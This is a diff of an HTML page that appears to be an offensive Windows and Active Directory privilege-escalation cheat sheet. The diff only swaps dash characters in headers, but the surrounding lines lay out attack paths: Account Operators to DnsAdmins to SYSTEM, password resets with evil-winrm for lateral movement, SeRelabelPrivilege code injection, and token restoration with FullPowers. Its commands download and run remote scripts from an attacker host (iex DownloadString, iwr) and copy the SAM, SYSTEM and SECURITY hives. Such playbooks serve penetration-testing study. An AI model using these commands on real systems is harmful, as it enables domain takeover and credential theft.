         <span><strong>Protected groups are off-limits:</strong> Account Operators cannot modify Domain Admins, Enterprise Admins, Schema Admins, Domain Controllers, Group Policy Creator Owners, or Read-only Domain Controllers. However, ANY other group is fair game - including Remote Desktop Users, Server Operators, DnsAdmins, Backup Operators, etc.</span>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack 1 &mdash; Add self to DnsAdmins → SYSTEM on DC</div>
+        <div class="section-header">&#9889; Attack 1  -  Add self to DnsAdmins → SYSTEM on DC</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -4286,7 +4286,7 @@ REM Now follow the DnsAdmins → SYSTEM attack path (see DnsAdmins page)</div>
         </div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack 2 &mdash; Reset a Service Account Password → Lateral Movement</div>
+        <div class="section-header">&#9889; Attack 2  -  Reset a Service Account Password → Lateral Movement</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -4321,7 +4321,7 @@ evil-winrm -i {{TARGET}} -u svc_backup -p P@ssw0rd123</div>
         </div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack 3 &mdash; Add new admin user directly</div>
+        <div class="section-header">&#9889; Attack 3  -  Add new admin user directly</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -4358,7 +4358,7 @@ REM Then RDP in and follow Server Operators → SYSTEM chain</div>
         <span><strong>How it works:</strong> Windows Mandatory Integrity Control (MIC) normally prevents low-integrity processes from writing to high-integrity objects. SeRelabelPrivilege lets you call <code>SetKernelObjectSecurity</code> with <code>LABEL_SECURITY_INFORMATION</code> to change an object's integrity label - including setting it LOWER than your current level or HIGHER (if you have access). This lets you effectively own any process or file by lowering its label to your level.</span>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack &mdash; Relabel SYSTEM process to Low IL → Take ownership → Code injection</div>
+        <div class="section-header">&#9889; Attack  -  Relabel SYSTEM process to Low IL → Take ownership → Code injection</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -4421,7 +4421,7 @@ REM Now you can write to it - place malicious DLL, trigger process restart → S
     <!-- FullPowers -->
     <div id="page-fullpowers" class="page">
       <div class="page-header">
-        <div class="page-title">&#128170; FullPowers &mdash; Restore Missing Tokens <span class="severity-badge sev-gold">TOKEN RECOVERY</span></div>
+        <div class="page-title">&#128170; FullPowers  -  Restore Missing Tokens <span class="severity-badge sev-gold">TOKEN RECOVERY</span></div>
         <div class="page-sub">// SERVICE ACCOUNTS WITH STRIPPED TOKENS &rarr; RESTORE SeImpersonate/SeAssignPrimaryToken</div>
       </div>
       <div class="info-grid">
@@ -4435,7 +4435,7 @@ REM Now you can write to it - place malicious DLL, trigger process restart → S
         <span><strong>Key distinction:</strong> <code>FullPowers.exe</code> recovers privileges that are <em>completely absent</em> from the token (stripped by Windows at spawn time). <code>EnableAllTokenPrivs.ps1</code> only enables privileges that are <em>present but disabled</em> in the current token. Use FullPowers when <code>whoami /priv</code> shows SeImpersonate is <em>missing entirely</em>; use EnableAllTokenPrivs when it shows <em>Disabled</em>.</span>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Method 1 &mdash; FullPowers.exe (itm4n) &mdash; Recover STRIPPED privileges</div>
+        <div class="section-header">&#9889; Method 1  -  FullPowers.exe (itm4n)  -  Recover STRIPPED privileges</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -4477,7 +4477,7 @@ REM Should now show SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege as 
         </div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Method 2 &mdash; EnableAllTokenPrivs.ps1 (fashionproof) &mdash; Enable DISABLED privileges</div>
+        <div class="section-header">&#9889; Method 2  -  EnableAllTokenPrivs.ps1 (fashionproof)  -  Enable DISABLED privileges</div>
         <div class="section-body">
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
@@ -4495,7 +4495,7 @@ powershell -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://{
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Run the script &mdash; enables ALL disabled privileges in current token</div>
+              <div class="step-title">Run the script  -  enables ALL disabled privileges in current token</div>
               <div class="code-block green">powershell -ep bypass -File {{WPATH}}\ep.ps1
 REM Verify all privs are now Enabled:
 whoami /priv</div>
@@ -4535,7 +4535,7 @@ robocopy /b C:\Windows\System32\config {{WPATH}} SAM SYSTEM SECURITY</div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Enable all disabled token privileges &mdash; EnableAllTokenPrivs.ps1 (fashionproof)</div>
+              <div class="step-title">Enable all disabled token privileges  -  EnableAllTokenPrivs.ps1 (fashionproof)</div>
               <div class="code-block purple">REM RECOMMENDED: PowerShell script that enables ALL disabled privs in one shot:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o {{WPATH}}\ep.ps1
 powershell -ep bypass -File {{WPATH}}\ep.ps1
@@ -4545,7 +4545,7 @@ REM Source: github.com/fashionproof/EnableAllTokenPrivs</div>
           <div class="step">
             <div class="step-num">1b</div>
             <div class="step-content">
-              <div class="step-title">Alternative: PrivFu PrivilegeEnabler.exe (daem0nc0re) &mdash; same result, EXE format</div>
+              <div class="step-title">Alternative: PrivFu PrivilegeEnabler.exe (daem0nc0re)  -  same result, EXE format</div>
               <div class="code-block purple">REM PrivFu toolkit - PrivilegedOperations\PrivilegeEnabler\bin\Release\PrivilegeEnabler.exe:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/PrivilegeEnabler.exe -o {{WPATH}}\PrivilegeEnabler.exe
 .\PrivilegeEnabler.exe
